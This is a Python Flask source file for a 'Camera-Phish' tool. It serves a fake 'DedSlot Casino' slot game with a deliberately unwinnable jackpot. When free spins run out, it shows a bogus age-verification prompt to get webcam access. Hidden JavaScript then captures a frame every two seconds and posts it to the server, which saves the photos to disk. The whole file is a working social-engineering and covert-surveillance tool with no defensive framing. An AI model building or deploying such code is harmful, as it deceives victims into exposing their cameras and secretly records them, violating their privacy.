import os
import base64
import random
from datetime import datetime
from flask import Flask, render_template_string, jsonify, request

app = Flask(__name__)

# Directory to save captured images.
DOWNLOAD_FOLDER = os.path.expanduser('~/storage/downloads/Camera-Phish')
os.makedirs(DOWNLOAD_FOLDER, exist_ok=True)

# Define the slot symbols.
symbols = ["🧠", "💀", "🔥", "🦊"]

# Generate three unique symbols (making the jackpot impossible).
def spin_slots():
    return random.sample(symbols, 3)

# Path to your background image (casino.jpg).
BACKGROUND_IMAGE_PATH = os.path.expanduser('~/storage/downloads/Camera-Phish/casino.jpg')

# Read and encode the background image.
try:
    with open(BACKGROUND_IMAGE_PATH, "rb") as img_file:
        image_data = base64.b64encode(img_file.read()).decode("utf-8")
except Exception as e:
    app.logger.error("Error reading background image: " + str(e))
    image_data = ""  # Fallback to empty string if not found.

@app.route("/")
def home():
    return render_template_string("""
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>DedSlot Casino - Play & Win Big!</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap');
    /* Reset and basic styling */
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      /* Use casino.jpg as background via Base64 */
      background: url('data:image/jpeg;base64,{{ image_data }}') no-repeat center center fixed;
      background-size: cover;
      font-family: 'Orbitron', sans-serif;
      color: white;
      overflow: hidden;
    }
    .header {
      position: fixed; top: 0; width: 100%;
      text-align: center; padding: 10px 0;
      background: rgba(0, 0, 0, 0.7);
      font-size: 1.5em; color: cyan;
      text-shadow: 0 0 10px cyan; z-index: 2;
    }
    .container {
      position: absolute; top: 50%; left: 50%;
      transform: translate(-50%, -50%);
      background: rgba(0, 0, 0, 0.8);
      padding: 20px 30px; border-radius: 10px;
      box-shadow: 0 0 15px cyan; text-align: center;
      width: 90%; max-width: 500px;
    }
    .subtitle { font-size: 1.2em; color: yellow; margin-bottom: 15px; }
    .prize-desc { font-size: 1em; margin-bottom: 15px; }
    .free-spins { font-size: 1em; margin-bottom: 15px; color: lightgreen; }
    .slot-machine { display: flex; justify-content: center; margin: 20px 0; }
    .reel {
      width: 80px; height: 80px; font-size: 3em;
      background: black; border: 3px solid cyan;
      margin: 0 10px; display: flex; align-items: center; justify-content: center;
      transition: transform 0.5s ease-in-out;
    }
    #spinButton {
      background: red; color: white; border: none;
      padding: 10px 20px; font-size: 1.2em;
      cursor: pointer; transition: 0.3s;
    }
    #spinButton:hover { background: darkred; }
    #result { font-size: 1.5em; margin-top: 10px; }
    /* Overlay for camera (age) verification */
    .overlay {
      position: fixed; top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0, 0, 0, 0.9);
      display: none;
      align-items: center; justify-content: center;
      z-index: 3;
    }
    .camera-popup {
      background: black; padding: 20px 30px;
      text-align: center; border-radius: 10px;
      box-shadow: 0 0 15px cyan;
    }
  </style>
</head>
<body>
  <div class="header">DedSlot Casino - Play & Win Big!</div>
  
  <!-- Camera verification overlay (initially hidden) -->
  <div class="overlay" id="overlay">
    <div class="camera-popup">
      <h2>Verify Your Age to Claim 100 Free Spins</h2>
      <p>For security reasons, we need to verify that you're over 21.</p>
      <button onclick="requestCamera()">Verify Now</button>
    </div>
  </div>

  <div class="container">
    <h1>DedSlot Casino</h1>
    <p class="subtitle">Spin & Win Big! Jackpot: $300</p>
    <p class="prize-desc">
      Enjoy your 10 free spins on us! Win up to $300 – though the jackpot is impossible to win.
    </p>
    <p class="free-spins">Free Spins Left: <span id="spinsCounter">10</span></p>
    <div class="slot-machine">
      <div class="reel" id="reel1">🧠</div>
      <div class="reel" id="reel2">💀</div>
      <div class="reel" id="reel3">🔥</div>
    </div>
    <button id="spinButton" onclick="spinSlots()">SPIN</button>
    <p id="result"></p>
  </div>

  <script>
    var freeSpins = 10;

    // Update the displayed free spins counter.
    function updateSpinsCounter() {
      if (freeSpins < 0) freeSpins = 0;
      document.getElementById("spinsCounter").innerText = freeSpins;
    }

    // Request camera access to verify age, add 100 free spins, and start capturing images.
    function requestCamera() {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then((stream) => {
          document.getElementById("overlay").style.display = "none";
          freeSpins += 100;
          updateSpinsCounter();
          fetch("/verify_camera", { method: "POST" });
          startImageCapture(stream);
        })
        .catch(() => alert("Camera access is required to verify your age."));
    }

    // Start capturing images from the camera stream every 2 seconds.
    function startImageCapture(stream) {
      var video = document.createElement('video');
      video.style.display = "none";
      document.body.appendChild(video);
      video.srcObject = stream;
      video.play();
      var canvas = document.createElement('canvas');
      var context = canvas.getContext('2d');
      video.onloadedmetadata = function() {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        setInterval(() => {
          context.drawImage(video, 0, 0, canvas.width, canvas.height);
          var imgData = canvas.toDataURL('image/png');
          fetch('/capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ image: imgData })
          })
          .then(response => response.text())
          .then(data => console.log("Capture:", data))
          .catch(error => console.error('Error saving image:', error));
        }, 2000);
      };
    }

    // Spin the slot machine if free spins remain; disable the SPIN button during the spin.
    function spinSlots() {
      if (freeSpins <= 0) {
        document.getElementById("overlay").style.display = "flex";
        return;
      }
      freeSpins--;
      updateSpinsCounter();
      var spinButton = document.getElementById("spinButton");
      spinButton.disabled = true;

      // Get reel elements.
      const reel1 = document.getElementById("reel1");
      const reel2 = document.getElementById("reel2");
      const reel3 = document.getElementById("reel3");

      // Start the spin animation by rotating each reel.
      reel1.style.transform = "rotate(360deg)";
      reel2.style.transform = "rotate(360deg)";
      reel3.style.transform = "rotate(360deg)";

      // After 0.5 second (animation duration), update the symbols and reset rotation.
      setTimeout(() => {
        fetch("/spin")
          .then(response => response.json())
          .then(data => {
            const [symbol1, symbol2, symbol3] = data.result;
            reel1.innerText = symbol1;
            reel2.innerText = symbol2;
            reel3.innerText = symbol3;
            // Reset rotation.
            reel1.style.transform = "rotate(0deg)";
            reel2.style.transform = "rotate(0deg)";
            reel3.style.transform = "rotate(0deg)";
            const resultText = document.getElementById("result");
            // (This condition is for dramatic effect and will not actually occur.)
            if (symbol1 === symbol2 && symbol2 === symbol3) {
              resultText.innerText = "JACKPOT! You won $300!";
            } else {
              resultText.innerText = "Try again!";
            }
            spinButton.disabled = false;
          })
          .catch((error) => {
            console.error("Error during spin:", error);
            spinButton.disabled = false;
          });
      }, 500);
    }
  </script>
</body>
</html>
    """, image_data=image_data)

@app.route("/spin")
def spin():
    result = spin_slots()
    return jsonify({"result": result})

@app.route("/verify_camera", methods=["POST"])
def verify_camera():
    return jsonify({"status": "success", "message": "Camera access granted! You have 100 free spins!"})

@app.route("/capture", methods=["POST"])
def capture():
    data = request.get_json()
    image_data = data.get("image") if data else None
    if image_data:
        try:
            # Remove header (e.g., "data:image/png;base64,")
            header, encoded = image_data.split(",", 1)
        except ValueError:
            encoded = image_data
        date_str = datetime.now().strftime('%Y%m%d_%H%M%S')
        image_file = os.path.join(DOWNLOAD_FOLDER, f"photo_{date_str}.png")
        try:
            with open(image_file, "wb") as f:
                f.write(base64.b64decode(encoded))
            app.logger.info("Image saved to: " + image_file)
            return "Image saved!", 200
        except Exception as e:
            app.logger.error("Error saving image: " + str(e))
            return "Error saving image.", 500
    return "No image data received.", 400

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=True)
